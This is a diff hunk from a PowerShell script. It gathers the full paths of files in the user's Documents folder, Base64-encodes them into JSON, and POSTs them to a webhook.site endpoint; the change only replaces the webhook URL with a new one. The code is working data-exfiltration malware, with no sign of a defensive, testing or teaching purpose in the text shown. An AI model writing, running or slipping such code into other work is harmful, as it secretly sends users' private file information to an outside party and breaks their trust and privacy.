@@ -4,4 +4,4 @@ $payload = @{
     Documents = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-ChildItem "$env:USERPROFILE\Documents").FullName -join "`n"))
 } | ConvertTo-Json
 
-Invoke-RestMethod -Uri "https://webhook.site/3ae63ffc-283e-4b4e-bddd-af249a92e266" -Method Post -ContentType "application/json" -Body $payload
+Invoke-RestMethod -Uri "https://webhook.site/d2a6eade-578f-4613-aa20-681df6ef6a4c" -Method Post -ContentType "application/json" -Body $payload
